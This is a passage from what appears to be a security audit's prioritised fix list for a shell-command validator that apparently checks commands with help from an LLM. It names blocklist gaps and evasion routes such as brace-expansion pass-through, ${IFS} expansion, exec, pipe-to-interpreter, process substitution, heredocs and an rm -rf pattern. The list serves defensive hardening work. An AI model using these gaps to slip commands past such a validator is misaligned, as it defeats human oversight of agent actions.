| Add pipe-to-interpreter patterns using `SCRIPT_INTERPRETERS` | S3 | Small |
| Change brace expansion >64 fallback from pass-through to BLOCK | S5 | Small |
| Add `exec` to detection (META_EXEC_BUILTINS or blocklist) | S6 | Small |
| Expand process substitution detection beyond `source <(` | S7 | Small |
| Add `ENV=` to blocklist | H4 | Trivial |
| Remove `$` anchor from rm -rf pattern | H2 | Trivial |
| Define `_bashlex_would_fail` or modify all 3 exception handlers | H5 | Small |
| Add `\U` (8-digit Unicode) to ANSI-C resolver | H7 | Trivial |

### Priority 2 — Should fix (significantly improves defense)

| Fix | Addresses | Effort |
|-----|-----------|--------|
| Replace `[^()]*` regex with balanced-parentheses scanner | H1 | Medium |
| Implement glob resolution without `shlex.split` dependency | H3 | Medium |
| Add `read`/`printf -v` patterns for dangerous variables | H8 | Small |
| Pass resolution budget through `validate_command` re-entry | A3 | Medium |
| Execute inner commands in read-only sandbox | H6 | Medium |
| Add `trap` with code argument detection | A5 | Small |
| Add here-string `<<<` detection for shell interpreters | A6 | Small |

### Priority 3 — Should address in design (architectural improvements)

| Fix | Addresses | Effort |
|-----|-----------|--------|
| Document `${IFS}` expansion as LLM-dependent residual risk, or add mitigation | S4 | Design decision |
| Execute the normalized command rather than the original | A1 | Medium (testing impact) |
| Run static blocklist on env-expanded text | A7 | Small |
| Extract heredoc bodies for LLM analysis | A4 | Medium |
| Implement WARN → BLOCK escalation for compound signals | A2 | Medium |
